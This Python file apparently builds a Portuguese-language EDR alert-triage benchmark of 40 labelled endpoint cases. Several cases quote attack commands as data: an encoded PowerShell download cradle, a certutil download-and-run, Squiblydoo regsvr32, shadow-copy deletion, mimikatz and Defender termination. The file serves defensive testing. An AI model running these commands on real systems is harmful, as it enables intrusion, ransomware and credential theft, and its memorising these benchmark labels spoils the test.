"""Casos de telemetria EDR (endpoint) para o benchmark.

40 alertas: 10 ALTA, 12 MEDIA, 8 BAIXA, 10 FALSO_POSITIVO — 8 ambiguos (20%).
"""

from __future__ import annotations


def casos_edr() -> list:
    from gerar_benchmark import Caso

    casos = [
        # --- ALTA (10) ---
        Caso(
            "EDR", "10.0.1.55", "0.0.0.0", 0, "TCP",
            "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMAAuADIALgA1ADAALwBwAC4AcABzADEAJwApAA==",
            "PowerShell com comando codificado em base64 baixando payload de IP externo, fora de janela de manutencao",
            "critical", "ALTA", "T1027", 0,
            "codificacao em base64 combinada com download ativo de payload externo e assinatura classica de comprometimento, sem justificativa operacional registrada.",
        ),
        Caso(
            "EDR", "10.0.1.62", "0.0.0.0", 0, "TCP",
            "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v UpdateSvc /t REG_SZ /d \"C:\\Users\\Public\\svchost32.exe\" /f",
            "Criacao de chave de registro Run apontando para executavel em pasta publica",
            "critical", "ALTA", "T1547", 0,
            "persistencia via chave Run apontando para binario em Users\\Public (local atipico) e forte indicio de malware.",
        ),
        Caso(
            "EDR", "10.0.1.71", "0.0.0.0", 0, "TCP",
            "vssadmin.exe delete shadows /all /quiet && wmic shadowcopy delete (seguido por criacao de 4.200 arquivos .locked em 3 min)",
            "Exclusao de copias de sombra seguida de criptografia em massa de arquivos",
            "critical", "ALTA", "T1486", 0,
            "sequencia de exclusao de shadow copies e criptografia em massa e assinatura definitiva de ransomware em execucao.",
        ),
        Caso(
            "EDR", "10.0.1.48", "203.0.113.220", 4444, "TCP",
            "notepad.exe com thread remota alocada por processo pai explorer.exe, conexao de rede iniciada por notepad.exe para 203.0.113.220:4444",
            "Process injection em notepad.exe com conexao de rede de saida suspeita (indicador de C2)",
            "critical", "ALTA", "T1055", 0,
            "processo benigno (notepad) realizando conexao de rede para IP externo em porta associada a frameworks de C2 indica injecao de codigo malicioso.",
        ),
        Caso(
            "EDR", "10.0.1.33", "0.0.0.0", 0, "TCP",
            "certutil.exe -urlcache -split -f http://198.51.100.90/update.exe C:\\Windows\\Temp\\svcupd.exe && start C:\\Windows\\Temp\\svcupd.exe",
            "Abuso de certutil (LOLBin) para baixar e executar binario de IP externo",
            "critical", "ALTA", "T1218", 0,
            "certutil usado fora de seu proposito (validacao de certificados) para baixar e executar payload externo e tecnica de evasao conhecida.",
        ),
        Caso(
            "EDR", "10.0.1.29", "0.0.0.0", 0, "TCP",
            "sc.exe create WinUpdateHelper binPath= \"C:\\ProgramData\\svc.exe\" start= auto && sc.exe start WinUpdateHelper (binario nao assinado, hash inedito)",
            "Criacao de servico com binario nao assinado apontando para ProgramData",
            "critical", "ALTA", "T1543", 0,
            "servico novo com binario nao assinado, hash desconhecido e nome mascarando-se como atualizacao do Windows.",
        ),
        Caso(
            "EDR", "10.0.1.81", "0.0.0.0", 0, "TCP",
            "schtasks /create /tn \"GoogleUpdateTaskMachineCore2\" /tr \"powershell -enc <base64>\" /sc onlogon /ru SYSTEM (nome quase identico ao legitimo GoogleUpdateTaskMachineCore)",
            "Tarefa agendada com nome mascarando servico legitimo, executando PowerShell codificado com privilegio SYSTEM",
            "critical", "ALTA", "T1053", 0,
            "typosquatting de nome de tarefa legitima do Google Update, combinado com PowerShell codificado e privilegio SYSTEM.",
        ),
        Caso(
            "EDR", "10.0.1.95", "0.0.0.0", 0, "TCP",
            "mimikatz.exe sekurlsa::logonpasswords executado por processo filho de winword.exe apos abertura de anexo 'contrato_final.docm'",
            "Execucao de ferramenta de dump de credenciais originada de macro de documento Office",
            "critical", "ALTA", "T1059", 0,
            "cadeia documento-macro-mimikatz e caminho classico de comprometimento inicial com extracao de credenciais em memoria.",
        ),
        Caso(
            "EDR", "10.0.1.14", "198.51.100.240", 8443, "TCP",
            "beacon.exe (hash nao reconhecido) estabelece conexao HTTPS para 198.51.100.240 a cada 45s com jitter de 10%, User-Agent Chrome falsificado",
            "Binario desconhecido com padrao de beaconing tipico de framework de comando e controle",
            "critical", "ALTA", "T1071", 0,
            "binario nao catalogado com padrao de beaconing e jitter caracteristico de framework C2 (Cobalt Strike/similar).",
        ),
        Caso(
            "EDR", "10.0.1.140", "10.0.4.9", 445, "TCP",
            "conta de servico 'svc_relatorios' (uso historico exclusivo em 10.0.4.x) autenticando via SMB em 10.0.1.140 (estacao de trabalho de RH) as 02:47, primeira ocorrencia em 8 meses de historico",
            "Conta de servico acessando host fora do seu padrao historico de uso",
            "medium", "ALTA", "T1078", 1,
            "conta de servico e tipicamente ruido de baixo risco, mas acessar um host totalmente fora do padrao historico (estacao de RH, nunca antes acessada) sugere uso indevido de credencial de servico — o contexto de anomalia comportamental inverte a leitura default de 'rotina'.",
        ),
        # --- MEDIA (12) ---
        Caso(
            "EDR", "10.0.1.50", "0.0.0.0", 0, "TCP",
            "rundll32.exe shell32.dll,Control_RunDLL (execucao padrao do Painel de Controle, mas invocada por processo pai incomum: outlook.exe)",
            "Uso de rundll32 por processo pai atipico, sem confirmacao de payload malicioso",
            "medium", "MEDIA", "T1218", 0,
            "combinacao incomum de processo pai/filho merece investigacao, mas sem payload confirmado ou rede associada.",
        ),
        Caso(
            "EDR", "10.0.1.63", "0.0.0.0", 0, "TCP",
            "reg add HKCU\\...\\Run /v OneDriveSync /t REG_SZ /d \"C:\\Users\\joao.silva\\AppData\\Local\\sync.exe\" (binario nao catalogado, sem assinatura)",
            "Nova entrada de autostart com binario nao catalogado em pasta de usuario",
            "medium", "MEDIA", "T1547", 0,
            "persistencia criada com binario nao catalogado, mas sem indicio adicional de atividade maliciosa confirmada.",
        ),
        Caso(
            "EDR", "10.0.1.44", "0.0.0.0", 0, "TCP",
            "powershell.exe -Command Get-Process | Where {$_.CPU -gt 100} (comando de diagnostico padrao, sem ofuscacao)",
            "Comando PowerShell de diagnostico de processos, sintaxe clara sem ofuscacao",
            "low", "MEDIA", "", 0,
            "comando legivel e de proposito administrativo comum, sem ofuscacao, mas registrado para acompanhamento por politica.",
        ),
        Caso(
            "EDR", "10.0.1.77", "0.0.0.0", 0, "TCP",
            "schtasks /create /tn \"DiskCleanupWeekly\" /tr \"cleanmgr.exe /sagerun:1\" /sc weekly (nome plausivel, mas nao consta em CMDB de tarefas aprovadas)",
            "Tarefa agendada de nome plausivel nao registrada no inventario de automacoes aprovadas",
            "medium", "MEDIA", "T1053", 0,
            "acao legitima em aparencia, mas ausencia no CMDB de tarefas aprovadas exige confirmacao com o responsavel pelo host.",
        ),
        Caso(
            "EDR", "10.0.1.88", "203.0.113.250", 443, "TCP",
            "explorer.exe realiza conexao de saida direta para 203.0.113.250:443 sem interacao de usuario visivel no periodo",
            "Processo do sistema com conexao de rede sem correlacao a acao de usuario",
            "medium", "MEDIA", "T1071", 0,
            "conexao de processo do sistema sem interacao de usuario e indicio moderado, mas sem confirmacao de injecao de codigo.",
        ),
        Caso(
            "EDR", "10.0.1.99", "0.0.0.0", 0, "TCP",
            "whoami /all && net user && net group \"Domain Admins\" /domain (sequencia de reconhecimento local executada por usuario padrao, nao administrador)",
            "Comandos de reconhecimento de privilegios executados por conta sem privilegio administrativo",
            "medium", "MEDIA", "T1059", 0,
            "sequencia de comandos de reconhecimento por usuario nao-admin sugere possivel fase inicial de escalonamento de privilegio.",
        ),
        Caso(
            "EDR", "10.0.1.101", "0.0.0.0", 0, "TCP",
            "AV heuristica: 'Trojan.GenericKD.12345' detectado em anexo baixado, arquivo removido automaticamente antes de execucao",
            "Deteccao heuristica de trojan genrico em arquivo, removido antes de execucao",
            "medium", "MEDIA", "", 0,
            "deteccao heuristica generica removida automaticamente antes de execucao reduz o risco, mas merece confirmacao de origem.",
        ),
        Caso(
            "EDR", "10.0.1.112", "0.0.0.0", 0, "TCP",
            "7z.exe a -pSenha123 backup_dados.zip C:\\Users\\ana.costa\\Documents\\* (compactacao com senha de pasta de documentos por usuario padrao)",
            "Compactacao protegida por senha de grande volume de documentos por usuario comum",
            "medium", "MEDIA", "T1005", 1,
            "o mesmo padrao tecnico (compactacao com senha de grande volume de documentos) e usado tanto em preparacao legitima de backup pessoal quanto em staging deliberado para exfiltracao — sem contexto adicional (destino do arquivo, historico do usuario), a assinatura isolada nao permite concluir intencao maliciosa nem descartar o caso.",
        ),
        Caso(
            "EDR", "10.0.1.120", "0.0.0.0", 0, "TCP",
            "taskkill /f /im MsMpEng.exe (tentativa de encerrar processo do Windows Defender)",
            "Tentativa de encerrar processo do antivirus via linha de comando",
            "high", "MEDIA", "T1059", 0,
            "tentativa de desabilitar o antivirus e sinal de evasao de defesa, classificado como media pendente confirmacao de sucesso (comando falhou, protecao tamper ativa).",
        ),
        Caso(
            "EDR", "10.0.1.130", "0.0.0.0", 0, "TCP",
            "net use Z: \\\\10.0.4.20\\backups /user:svc_backup <senha_hardcoded_no_script> (credencial em texto plano em script .bat encontrado em C:\\Scripts\\)",
            "Credencial em texto plano embutida em script de automacao local",
            "medium", "MEDIA", "T1552", 0,
            "credencial hardcoded em script e ma pratica de seguranca com risco real, mas restrita ao ambiente interno e sem exfiltracao confirmada.",
        ),
        Caso(
            "EDR", "10.0.1.150", "0.0.0.0", 0, "TCP",
            "regsvr32.exe /s /u /i:http://198.51.100.77/file.sct scrobj.dll (tecnica Squiblydoo de execucao remota)",
            "Uso de regsvr32 com parametros caracteristicos da tecnica Squiblydoo",
            "high", "MEDIA", "T1218", 0,
            "assinatura de tecnica de evasao conhecida (Squiblydoo), porem conexao ao host remoto nao foi confirmada como bem-sucedida.",
        ),
        Caso(
            "EDR", "10.0.1.160", "0.0.0.0", 0, "TCP",
            "wmic process call create \"cmd.exe /c ping -n 60 127.0.0.1\" (execucao via WMI de comando de baixo risco, mas tecnica de execucao atipica para o usuario)",
            "Execucao de processo via WMI por usuario sem historico de uso dessa tecnica",
            "medium", "MEDIA", "T1059", 0,
            "tecnica de execucao atipica (WMI) para o perfil do usuario, mas comando executado e inofensivo (ping local).",
        ),
        # --- BAIXA (8) ---
        Caso(
            "EDR", "10.0.1.170", "0.0.0.0", 0, "TCP",
            "powershell.exe -File C:\\ProgramData\\TI\\backup_config.ps1 (script assinado internamente, executado em janela de manutencao 02:00-04:00 por conta admin_ti)",
            "Script PowerShell assinado executado por administrador em janela de manutencao programada",
            "low", "BAIXA", "T1027", 1,
            "PowerShell codificado/complexo por si so pareceria suspeito, mas a assinatura interna valida, a conta de administrador de TI e a janela de manutencao programada indicam operacao rotineira legitima.",
        ),
        Caso(
            "EDR", "10.0.1.180", "0.0.0.0", 0, "TCP",
            "chrome.exe alocando alto uso de memoria (1.8GB) com 40 abas abertas, sem atividade de rede incomum",
            "Alto consumo de memoria por navegador com muitas abas abertas",
            "low", "BAIXA", "", 0,
            "consumo elevado de memoria explicado por numero de abas abertas, sem qualquer indicador de comprometimento.",
        ),
        Caso(
            "EDR", "10.0.1.190", "0.0.0.0", 0, "TCP",
            "AV: assinatura desatualizada ha 3 dias por falha de sincronizacao com servidor de definicoes interno",
            "Alerta de definicoes de antivirus desatualizadas por falha tecnica",
            "low", "BAIXA", "", 0,
            "alerta operacional de infraestrutura (sincronizacao falhou), sem indicio de ameaca ativa no endpoint.",
        ),
        Caso(
            "EDR", "10.0.1.200", "0.0.0.0", 0, "TCP",
            "novo dispositivo USB (unidade de armazenamento) conectado por usuario com permissao de uso de midia removivel aprovada em politica",
            "Conexao de dispositivo USB de armazenamento por usuario autorizado",
            "low", "BAIXA", "", 0,
            "usuario possui permissao formal de uso de midia removivel conforme politica de DLP, sem violacao.",
        ),
        Caso(
            "EDR", "10.0.1.210", "0.0.0.0", 0, "TCP",
            "explorer.exe reiniciado apos crash (Event ID 1002, Application Hang), sem outros processos anomalos no periodo",
            "Reinicializacao do explorer.exe apos travamento, sem outros indicadores",
            "low", "BAIXA", "", 0,
            "travamento isolado do explorer.exe e evento comum de estabilidade do sistema operacional, sem relacao com ameaca.",
        ),
        Caso(
            "EDR", "10.0.1.220", "0.0.0.0", 0, "TCP",
            "cmd.exe /c dir C:\\Users\\ (comando trivial de listagem executado por usuario padrao em sua propria sessao)",
            "Comando de listagem de diretorio simples, sem indicio de automacao ou ataque",
            "low", "BAIXA", "", 0,
            "comando trivial e de escopo minimo, tipico de uso interativo normal do usuario.",
        ),
        Caso(
            "EDR", "10.0.1.230", "0.0.0.0", 0, "TCP",
            "aplicativo de terceiros nao catalogado 'ScreenRecorderFree.exe' instalado por usuario com permissao local de instalacao",
            "Instalacao de software nao catalogado por usuario com permissao valida",
            "low", "BAIXA", "", 0,
            "instalacao dentro da permissao do usuario, aplicativo sem reputacao maliciosa conhecida, apenas nao inventariado.",
        ),
        Caso(
            "EDR", "10.0.1.240", "0.0.0.0", 0, "TCP",
            "powershell.exe Get-ChildItem -Recurse C:\\temp (varredura simples de diretorio temporario por script de limpeza conhecido)",
            "Comando PowerShell simples de listagem recursiva sem ofuscacao ou rede",
            "low", "BAIXA", "", 0,
            "comando claro, sem codificacao, sem atividade de rede associada — utilitario de limpeza de rotina.",
        ),
        # --- FALSO_POSITIVO (10) ---
        Caso(
            "EDR", "10.0.1.250", "0.0.0.0", 0, "TCP",
            "powershell.exe -enc <base64 de 'Get-WmiObject Win32_Product | Export-Csv inventario.csv'> executado pela conta admin_ti as 03:10, dentro da janela de manutencao MW-2026-04 aprovada",
            "PowerShell codificado em base64 usado por administrador para inventario de software em janela de manutencao aprovada",
            "medium", "FALSO_POSITIVO", "T1027", 1,
            "o comando decodificado e um inventario de software inofensivo; a codificacao base64 e apenas o metodo padrao da equipe de TI para evitar problemas de escaping de aspas no agendador, executado por conta administrativa dentro de janela formalmente aprovada — o padrao tecnico (PowerShell -enc) sozinho pareceria malicioso.",
        ),
        Caso(
            "EDR", "10.0.1.251", "0.0.0.0", 0, "TCP",
            "vssadmin.exe list shadows executado por script de backup corporativo 'Veeam Agent' (processo assinado digitalmente pela Veeam Software)",
            "Consulta de copias de sombra por agente de backup corporativo assinado",
            "low", "FALSO_POSITIVO", "", 1,
            "vssadmin.exe e o mesmo binario usado na fase de preparacao de ataques de ransomware (ver caso ALTA de exclusao de shadow copies neste benchmark); apenas o verbo 'list' (consulta, nao exclusao) e a assinatura digital do processo Veeam distinguem esta ocorrencia de um precursor de ransomware.",
        ),
        Caso(
            "EDR", "10.0.1.252", "0.0.0.0", 0, "TCP",
            "schtasks /create /tn \"CrowdStrikeSensorUpdate\" /tr \"C:\\Program Files\\CrowdStrike\\updater.exe\" /sc daily (binario assinado pela CrowdStrike, hash verificado)",
            "Tarefa agendada de atualizacao do proprio agente EDR, binario assinado e verificado",
            "low", "FALSO_POSITIVO", "", 0,
            "tarefa de atualizacao do agente de seguranca legitimo, binario com assinatura digital verificada.",
        ),
        Caso(
            "EDR", "10.0.1.253", "0.0.0.0", 0, "TCP",
            "regsvr32.exe /s C:\\Program Files\\Adobe\\Acrobat\\pdfshell.dll (registro de shell extension padrao apos instalacao do Adobe Acrobat)",
            "Registro de DLL padrao durante instalacao legitima de software Adobe",
            "low", "FALSO_POSITIVO", "", 0,
            "uso documentado e esperado de regsvr32 pelo instalador oficial da Adobe, sem parametros de rede remota.",
        ),
        Caso(
            "EDR", "10.0.1.254", "0.0.0.0", 0, "TCP",
            "7z.exe a -pXYZ backup_local.zip C:\\ProgramData\\App\\logs (compactacao protegida por senha de logs de aplicacao, executada pelo proprio servico automatico as 01:00)",
            "Compactacao de logs de aplicacao por rotina automatica agendada do proprio servico",
            "low", "FALSO_POSITIVO", "T1005", 0,
            "processo e horario correspondem exatamente a rotina documentada de rotacao/arquivamento de logs do servico.",
        ),
        Caso(
            "EDR", "10.0.2.100", "0.0.0.0", 0, "TCP",
            "mimikatz.exe executado por conta 'redteam.operator' em host isolado de laboratorio de testes (VLAN de pentest), sessao registrada em ticket PT-2026-014",
            "Ferramenta de dump de credenciais executada em ambiente de laboratorio de pentest autorizado",
            "high", "FALSO_POSITIVO", "T1059", 1,
            "mimikatz e ferramenta de ataque real, mas a VLAN isolada de laboratorio e o ticket de pentest aprovado confirmam uso controlado e autorizado — fora desse contexto, o mesmo evento seria ALTA.",
        ),
        Caso(
            "EDR", "10.0.2.101", "0.0.0.0", 0, "TCP",
            "AV heuristica sinaliza ferramenta 'PsExec.exe' baixada pelo administrador de infraestrutura para deploy remoto autorizado via processo de mudanca CR-9012",
            "Ferramenta administrativa dual-use sinalizada por heuristica, uso documentado em processo de mudanca",
            "low", "FALSO_POSITIVO", "T1218", 1,
            "PsExec e amplamente abusada por atacantes para movimento lateral, e a deteccao heuristica generica nao distingue uso ofensivo de administrativo; somente o processo de mudanca aprovado (CR-9012) confirma que se trata de deploy remoto legitimo.",
        ),
        Caso(
            "EDR", "10.0.2.102", "0.0.0.0", 0, "TCP",
            "chave commitada em repositorio interno 'AKIA_TESTE_1234567890' identificada em arquivo .env.example do ambiente de testes, sem permissoes associadas (chave inativa de sandbox)",
            "Chave de exemplo em ambiente de testes identificada por scanner de segredo",
            "low", "FALSO_POSITIVO", "T1552", 1,
            "embora scanners de segredo tratem qualquer chave AKIA como critica por padrao, esta e uma chave de sandbox sem permissoes reais, documentada como exemplo em .env.example — o padrao textual (formato de chave AWS) sozinho sugeriria vazamento grave, mas o contexto (chave de teste inativa) reduz a BAIXA.",
        ),
        Caso(
            "EDR", "10.0.2.103", "0.0.0.0", 0, "TCP",
            "Windows Defender ATP: 'PUA:Win32/InstallCore' detectado e bloqueado automaticamente durante instalacao de software freeware por usuario",
            "Bloqueio automatico de aplicativo potencialmente indesejado por antivirus",
            "low", "FALSO_POSITIVO", "", 0,
            "PUA bloqueado automaticamente pelo proprio antivirus antes de qualquer execucao, sem necessidade de acao adicional.",
        ),
        Caso(
            "EDR", "10.0.2.104", "0.0.0.0", 0, "TCP",
            "powershell.exe Invoke-WebRequest -Uri https://repo-interno.empresa.com/agente/v2.3/instalador.ps1 -OutFile instalador.ps1 (dominio interno corporativo, executado pelo agente de gerenciamento de patches SCCM)",
            "Download de script via PowerShell originado de repositorio interno oficial pelo agente corporativo de gerenciamento de patches",
            "low", "FALSO_POSITIVO", "", 0,
            "dominio de origem e interno e corresponde ao repositorio oficial de distribuicao de agentes, execucao feita pelo proprio SCCM corporativo.",
        ),
    ]
    assert len(casos) == 40, f"EDR deve ter 40 casos, tem {len(casos)}"
    return casos
